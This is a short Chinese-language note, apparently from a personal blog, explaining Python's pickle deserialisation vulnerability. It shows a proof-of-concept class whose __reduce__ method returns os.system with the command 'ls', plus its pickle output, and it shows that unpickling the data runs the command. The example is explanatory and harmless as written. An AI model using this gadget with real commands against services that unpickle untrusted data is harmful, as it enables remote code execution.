---
title: "Pickle"
date: 2016-03-25 00:41
---

## pickle 序列化漏洞

* \_\_reduce\_\_(self)

当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 \_\_reduce\_\_ 被定义之后，当对象被Pickle时就会被调用。

它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，

要么返回一个元组。这个元组包含2到5个元素，其中包括：**一个可调用的对象，用于重建对象时调用**；**一个参数元素，供那个可调用对象使用**；

被传递给 __setstate__ 的状态（可选）；

一个产生被pickle的列表元素的迭代器（可选）；

一个产生被pickle的字典元素的迭代器（可选）

```
import os
import pickle

class exp(object):

    def __reduce__(self):
        cmd = 'ls'
        return (os.system, (cmd,))

pickle.dumps(exp())
>  "cposix\nsystem\np0\n(S'ls'\np1\ntp2\nRp3\n."

pickle.dumps((os.system, ('ls',)))
> "(cposix\nsystem\np0\n(S'ls'\np1\ntp2\ntp3\n."

pickle.loads(pickle.dumps(exp()))
# it will do os.system(cmd)
> read.txt

pickle.loads(pickle.dumps((os.system, ('ls',))))
> (<function posix.system>, ('ls',))
```
